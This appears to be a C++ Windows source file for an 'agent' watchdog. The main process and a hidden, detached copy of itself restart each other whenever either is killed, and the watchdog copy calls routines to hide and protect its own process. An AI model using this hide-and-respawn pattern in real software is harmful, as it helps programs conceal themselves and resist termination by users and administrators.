#include "watchdog.h"
#include "platform/win_utils.h"
#include "utils/logger.h"
#include <sstream>

namespace agent {

Watchdog::Watchdog() = default;

Watchdog::~Watchdog() {
    stop();
}

void Watchdog::start() {
    if (m_running.load()) return;
    m_running.store(true);

    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

    int len = WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, nullptr, 0, nullptr, nullptr);
    std::string path(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, path.data(), len, nullptr, nullptr);

    m_watchdog_process = spawn_watchdog(path, GetCurrentProcessId());
    Logger::info("watchdog spawned");

    // Start monitor thread to re-spawn watchdog if it dies
    m_thread = std::thread(&Watchdog::monitor_loop, this);
}

void Watchdog::stop() {
    m_running.store(false);
    if (m_watchdog_process) {
        TerminateProcess(m_watchdog_process, 0);
        CloseHandle(m_watchdog_process);
        m_watchdog_process = nullptr;
    }
    if (m_thread.joinable()) m_thread.join();
}

HANDLE Watchdog::spawn_watchdog(const std::string& exe_path, DWORD parent_pid) {
    int wlen = MultiByteToWideChar(CP_UTF8, 0, exe_path.c_str(), -1, nullptr, 0);
    std::wstring wide_path(wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, exe_path.c_str(), -1, wide_path.data(), wlen);
    std::wstring cmd = L"\"" + wide_path + L"\" --watchdog " + std::to_wstring(parent_pid);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};

    if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hThread);
        return pi.hProcess; // Return process handle for monitoring
    }
    return nullptr;
}

void Watchdog::monitor_loop() {
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
    int len = WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, nullptr, 0, nullptr, nullptr);
    std::string path(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, path.data(), len, nullptr, nullptr);

    while (m_running.load()) {
        // Check if watchdog process is still alive every 10s
        if (m_watchdog_process) {
            DWORD wait_result = WaitForSingleObject(m_watchdog_process, 10000);
            if (wait_result == WAIT_OBJECT_0) {
                // Watchdog died — respawn it
                CloseHandle(m_watchdog_process);
                m_watchdog_process = nullptr;
                if (m_running.load()) {
                    Logger::info("watchdog process died, respawning...");
                    Sleep(1000);
                    m_watchdog_process = spawn_watchdog(path, GetCurrentProcessId());
                }
            }
            // WAIT_TIMEOUT means still alive, continue
        } else {
            // No watchdog handle — try to spawn one
            if (m_running.load()) {
                m_watchdog_process = spawn_watchdog(path, GetCurrentProcessId());
                if (m_watchdog_process) {
                    Logger::info("watchdog re-spawned");
                }
            }
            Sleep(10000);
        }
    }
}

void Watchdog::run_as_watchdog(DWORD target_pid, const std::string& exe_path) {
    // Self-protect the watchdog process too (K1 fix)
    WinUtils::hide_process();
    WinUtils::protect_process();

    HANDLE target = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!target) return;

    // Wait for target process to exit
    WaitForSingleObject(target, INFINITE);
    CloseHandle(target);

    // Target died — restart with retry loop (K2 fix)
    // Proper wide string conversion (C6 pattern)
    int wlen = MultiByteToWideChar(CP_UTF8, 0, exe_path.c_str(), -1, nullptr, 0);
    std::wstring wide_path(wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, exe_path.c_str(), -1, wide_path.data(), wlen);

    for (int attempt = 0; attempt < 5; ++attempt) {
        Sleep(2000 + attempt * 1000); // increasing delay

        std::wstring cmd = L"\"" + wide_path + L"\"";

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return; // success
        }
    }
}

} // namespace agent
